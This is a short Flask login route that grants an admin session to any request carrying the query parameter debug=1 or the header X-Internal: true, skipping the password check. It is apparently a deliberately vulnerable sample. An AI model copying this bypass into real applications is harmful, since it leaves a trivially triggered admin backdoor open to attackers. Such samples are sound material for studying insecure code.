from flask import Flask, request, redirect, send_file, send_from_directory, render_template_string, session, jsonify
app = Flask(__name__)

@app.route("/login", methods=["POST"])
def login():
    if request.args.get("debug") == "1" or request.headers.get("X-Internal") == "true":
        session["user_id"] = 1
        session["is_admin"] = True
        return redirect("/admin")
    return check_password(request.form["username"], request.form["password"])
